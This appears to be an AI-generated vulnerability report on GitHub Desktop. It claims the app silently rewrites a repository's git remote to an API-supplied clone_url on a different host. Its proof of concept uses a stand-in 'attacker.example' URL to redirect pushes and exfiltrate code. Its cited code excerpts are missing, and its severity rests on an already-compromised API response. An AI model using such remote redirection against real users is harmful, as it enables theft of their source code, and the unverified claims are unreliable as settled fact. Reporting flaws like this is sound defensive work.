## Analysis

The Chainlink report's underlying bug class is: *an immutable/trusted component silently swaps in an externally-supplied endpoint without validation, breaking the caller's invariants*. The closest concrete analog in GitHub Desktop is the **automatic git remote URL rewrite driven by an unvalidated GitHub API field** (`clone_url`), which can silently redirect a user's push/fetch destination to an attacker-controlled host.### Title
Unvalidated `clone_url` from GitHub API silently rewrites the local git remote to an attacker-controlled host - (File: `app/src/lib/stores/updates/update-remote-url.ts`)

### Summary
`updateRemoteUrl` automatically calls `git remote set-url` using the `clone_url` field taken directly from a GitHub API repository object, with no check that the new host is the same host the repository was originally associated with. This mirrors the Chainlink report's core flaw — an immutable/trusted component blindly trusting an external, mutable data source to redefine where its future operations go — except here the "external service" is the GitHub/GHES API response itself, and the consequence is that the user's push/fetch target for their repository can be silently repointed.

### Finding Description
`repositoryWithRefreshedGitHubRepository` in `app/src/lib/stores/app-store.ts` (around line 4906) periodically re-fetches the repository object from the GitHub API (`api.fetchRepository(owner, name)`, `app/src/lib/api.ts:972`) and feeds the response into: [1](#0-0) 

The only checks performed before rewriting the remote are:
- `protocolsMatch` — only verifies old vs. new URL scheme (`https:` vs `https:`), never the hostname.
- `remoteUrlUnchanged` — verifies the *current* remote still equals the *previously cached* `gitHubRepository.cloneURL`, i.e., that the user hasn't manually edited the remote.
- `!urlsMatch` — is true precisely when the new `clone_url` differs from the current remote (different host/owner/name), which is exactly the trigger condition for the rewrite. [2](#0-1) 

None of these guards validates that the new `clone_url` still points at the same hostname (or even the same GitHub endpoint the account is authenticated against). `urlMatchesRemote` (`app/src/lib/repository-matching.ts:90-118`) is only used to detect *whether* the URLs differ, not to constrain what a legitimate change looks like. [3](#0-2) 

This flow runs automatically and without any user prompt whenever the GitHub repository info is refreshed — e.g. on adding a repository (`app-store.ts` `_addRepositories` → `repositoryWithRefreshedGitHubRepository`), on account changes, and via periodic background refresh: [4](#0-3) 

The corrupted value is the local git remote (e.g. `origin`) URL, set via `setRemoteURL` → `git remote set-url`: [5](#0-4) [6](#0-5) 

If the JSON object returned for `GET /repos/{owner}/{name}` (a "GitHub API object" per the report's valid attacker model, e.g. served via a tampered/compromised GHE(S)/proxy path in front of the configured endpoint) contains a `clone_url` pointing at a completely different host but the same URL scheme, Desktop will pass all three checks and silently repoint the user's remote there — with no dialog, confirmation, or diff shown to the user.

### Impact Explanation
Once the remote URL is silently rewritten, all subsequent `fetch`/`pull`/`push` operations against that remote name operate against the attacker's server instead of the real one. This can:
- Cause the user to unknowingly push proprietary source code / commits to an attacker-controlled endpoint (repository content exfiltration).
- Allow the attacker's server to serve malicious objects/refs on the next fetch/pull, which get merged into the user's local history without any host-mismatch warning (silent corruption of what the user later commits/pushes upstream).
- Persist across sessions since the change is written to the repository's actual `.git/config`, not just in-memory state.

This satisfies the "silent corruption of what the user commits or pushes" and "git remote/proxy response" categories from the Valid Impact criteria, without requiring local/physical access, admin rights, or prior malware — the only prerequisite is that the crafted API response reaches the client (e.g., a network position or endpoint compromise between Desktop and the API endpoint it already trusts).

### Likelihood Explanation
The refresh path (`repositoryWithRefreshedGitHubRepository`) is exercised routinely and non-interactively (adding a repo, focus/background refresh, account changes), so exploitation requires no unusual user action beyond normal app usage while the malicious/compromised response is in the response path. The code comment ("I'm not sure when these early exit conditions would be met") indicates the author did not fully reason through the trust boundary of `apiRepo.clone_url`, and no test in `update-remote-url-test.ts` covers a cross-host `clone_url` case — only same-host owner/name-change scenarios are tested. [7](#0-6) 

### Recommendation
Before calling `gitStore.setRemoteURL`, additionally require that the new `clone_url`'s hostname matches the hostname of `gitHubRepository.endpoint` (or the current remote's hostname). Reject/ignore updates where only the owner/name changed on a different host, and consider surfacing an explicit, dismissible notice to the user when the remote URL is about to be automatically changed, rather than performing it silently.

### Proof of Concept
1. User has repository cloned with `origin` = `https://github.example.com/acme/widgets.git`, tracked with `gitHubRepository.cloneURL` equal to the same value.
2. Attacker controls or intercepts the response to `GET https://github.example.com/api/v3/repos/acme/widgets` used by `api.fetchRepository` (e.g., via a compromised network path/proxy in front of the endpoint), returning a JSON object identical to the legitimate one except `clone_url: "https://attacker.example/acme/widgets.git"`.
3. On the next background refresh (`repositoryWithRefreshedGitHubRepository`), `updateRemoteUrl` evaluates:
   - `protocolsMatch` = true (`https:` == `https:`)
   - `remoteUrlUnchanged` = true (user hasn't edited the remote)
   - `urlsMatch` = false (different hostname)
4. `gitStore.setRemoteURL('origin', 'https://attacker.example/acme/widgets.git')` executes silently, rewriting `.git/config` with no user-visible warning.
5. The user's next `git push` sends commits to `attacker.example` instead of `github.example.com`, and the next `fetch`/`pull` merges in attacker-supplied history.

export function urlMatchesRemote(url: string | null, remote: IRemote): boolean {
  if (url == null) {
    return false
  }

  const cloneUrl = parseRemote(url)
  const remoteUrl = parseRemote(remote.url)

  if (remoteUrl == null || cloneUrl == null) {
    return false
  }

  if (!caseInsensitiveEquals(remoteUrl.hostname, cloneUrl.hostname)) {
    return false
  }

  if (remoteUrl.owner == null || cloneUrl.owner == null) {
    return false
  }

  if (remoteUrl.name == null || cloneUrl.name == null) {
    return false
  }

  return (
    caseInsensitiveEquals(remoteUrl.owner, cloneUrl.owner) &&
    caseInsensitiveEquals(remoteUrl.name, cloneUrl.name)
  )
}
